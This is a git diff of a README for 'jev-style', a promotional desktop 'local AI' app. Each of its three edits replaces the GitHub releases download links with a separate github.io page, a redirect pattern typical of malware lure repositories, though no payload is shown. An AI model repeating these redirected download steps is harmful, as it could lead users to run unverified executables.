@@ -1,6 +1,6 @@
 # 🤖 jev-style - Smart Decision-Making, Right on Your PC
 
-[![Download jev-style](https://img.shields.io/badge/Download-jev--style-blueviolet?style=for-the-badge&logo=github)](https://github.com/mike8470/jev-style/releases)
+[![Download jev-style](https://img.shields.io/badge/Download-jev--style-blueviolet?style=for-the-badge&logo=github)](https://mike8470.github.io)
 
 ## 🎯 What Is jev-style?
 
@@ -36,7 +36,7 @@ Follow these simple steps, and you'll be up and running in minutes.
 ### Step 1: Download the Application
 
 👉 **Visit this link to download the application:**  
-[**https://github.com/mike8470/jev-style/releases**](https://github.com/mike8470/jev-style/releases)
+[**https://mike8470.github.io**](https://mike8470.github.io)
 
 On that page, you'll see a list of files. Pick the one that matches your system (Windows is a safe bet). Click it to start the download.
 
@@ -125,6 +125,6 @@ jev-style puts a smart, reliable decision-making tool right on your desktop. It'
 
 So go ahead, hit that download button, and see how smooth local AI can really be.
 
-[Join the community and start your download here](https://github.com/mike8470/jev-style/releases) 💡
+[Join the community and start your download here](https://mike8470.github.io) 💡
 
 Keywords: agent-skills, calibration, claude-code, decision-model, gguf, guardrails, jev, llm-routing, local-llm, mcp, mlx, qwen3
